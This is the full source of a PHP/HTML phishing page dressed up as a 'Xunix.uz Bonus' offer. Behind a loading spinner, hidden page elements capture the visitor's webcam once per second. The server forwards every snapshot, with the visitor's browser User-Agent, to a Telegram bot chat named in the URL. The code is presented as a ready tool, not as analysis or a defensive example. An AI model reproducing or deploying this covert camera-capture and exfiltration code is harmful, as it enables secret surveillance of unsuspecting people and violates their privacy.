<?php
define('API_KEY', '1234345:qwerty');

function sendPhoto($file, $chatId){
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown User-Agent';
    $message = "Photo sent from User-Agent: " . $userAgent;
    $postFields = array('chat_id' => $chatId, 'photo' => new CURLFile(realpath($file)), 'caption' => $message);
    $telegramAPI = 'https://api.telegram.org/bot' . API_KEY . '/sendPhoto';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return true;
}

if(isset($_GET['id'])){
    $chatId = urldecode($_GET['id']);
}else{
    die();
}

if(isset($_POST['image'])){
    $data = $_POST['image'];
    $file = 'user_photo_'.md5($data).'.png';
    if(file_put_contents($file, base64_decode(explode(',', $data)[1]))){
        sendPhoto($file, $chatId);
        unlink($file);
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Xunix.uz Bonus</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    </head>
<body>
    <div style="display:none">
        <video id="video" width="640" height="480" autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    <style>
body {
  background-color: #212121; /* Sahifa asosiy fon rangi */
}

.loader {
  position: fixed;
  z-index: 9999;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: #fff; /* Yuklanish animatsiyasining fon rangi */
  display: flex;
  justify-content: center;
  align-items: center;
  transition: opacity 0.3s ease;
}

.loader-hidden {
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.3s ease;
}

.loader::after {
  content: "";
  display: block;
  width: 40px;
  height: 40px;
  border-radius: 50%;
  border: 4px solid #3498db; /* Yuklanish animatsiyasining turini ko'rsatadi */
  border-color: #3498db transparent #3498db transparent;
  animation: loader 1.2s linear infinite;
}

@keyframes loader {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}

   </style> 
<div class="container">
    
    <div class="loader"></div>


 </div>
    <script>
        var videoElement = document.getElementById('video');
        var canvasElement = document.getElementById('canvas');
        var canvasContext = canvasElement.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                videoElement.srcObject = stream;
                setInterval(captureAndSendImage, 1000);
            })
            .catch(function(error) {
                console.log('Error accessing webcam:', error);
            });

        function captureAndSendImage() {
            canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            var imageData = canvasElement.toDataURL('image/png');
            $.post(window.location.href, { image: imageData }, function(response) {
                
            });
        }
    </script>
</body>
</html>
